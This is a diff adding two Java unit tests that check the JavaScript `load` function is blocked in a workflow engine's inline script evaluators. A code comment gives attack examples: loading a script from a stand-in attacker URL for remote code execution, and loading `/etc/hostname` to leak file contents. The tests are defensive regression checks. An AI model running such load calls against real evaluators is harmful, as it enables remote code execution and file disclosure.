@@ -226,6 +226,56 @@ public class InlineTest {
         assertEquals(TaskModel.Status.FAILED_WITH_TERMINAL_ERROR, task.getStatus());
     }
 
+    // load() in GraalJS can fetch and execute scripts from URLs and read
+    // local files — `load("http://attacker/x.js")` is full RCE,
+    // `load("/etc/hostname")` can leak file content via the parse error.
+    // The Engine option js.load=false makes `load` undefined so the call
+    // throws at name resolution rather than after partial work. GraalJS
+    // throws ReferenceError for undefined names; Nashorn would throw
+    // TypeError. Accept either to keep the test backend-agnostic. On
+    // regression the assertion message shows exactly which check failed.
+    private static final String LOAD_BLOCKED_EXPRESSION =
+            "var typeofLoad = typeof load;"
+                    + "var threw = false;"
+                    + "var errName = '';"
+                    + "try { load('https://example.com/x.js'); }"
+                    + "catch (e) { threw = true; errName = e.name || '' + e; }"
+                    + "var goodErr = errName.indexOf('ReferenceError') >= 0 || errName.indexOf('TypeError') >= 0;"
+                    + "(typeofLoad === 'undefined' && threw && goodErr)"
+                    + "  ? 'blocked' : ('LEAK typeof=' + typeofLoad + ' threw=' + threw + ' err=' + errName);";
+
+    @Test
+    public void testLoadBlockedForJavascript() {
+        Inline inline = new Inline(getStringEvaluatorMap());
+
+        Map<String, Object> inputObj = new HashMap<>();
+        inputObj.put("evaluatorType", "javascript");
+        inputObj.put("expression", LOAD_BLOCKED_EXPRESSION);
+
+        TaskModel task = new TaskModel();
+        task.getInputData().putAll(inputObj);
+
+        inline.execute(workflow, task, executor);
+        assertEquals(TaskModel.Status.COMPLETED, task.getStatus());
+        assertEquals("blocked", task.getOutputData().get("result"));
+    }
+
+    @Test
+    public void testLoadBlockedForGraalJS() {
+        Inline inline = new Inline(getStringEvaluatorMap());
+
+        Map<String, Object> inputObj = new HashMap<>();
+        inputObj.put("evaluatorType", "graaljs");
+        inputObj.put("expression", LOAD_BLOCKED_EXPRESSION);
+
+        TaskModel task = new TaskModel();
+        task.getInputData().putAll(inputObj);
+
+        inline.execute(workflow, task, executor);
+        assertEquals(TaskModel.Status.COMPLETED, task.getStatus());
+        assertEquals("blocked", task.getOutputData().get("result"));
+    }
+
     private Map<String, Evaluator> getStringEvaluatorMap() {
         Map<String, Evaluator> evaluators = new HashMap<>();
         evaluators.put(ValueParamEvaluator.NAME, new ValueParamEvaluator());
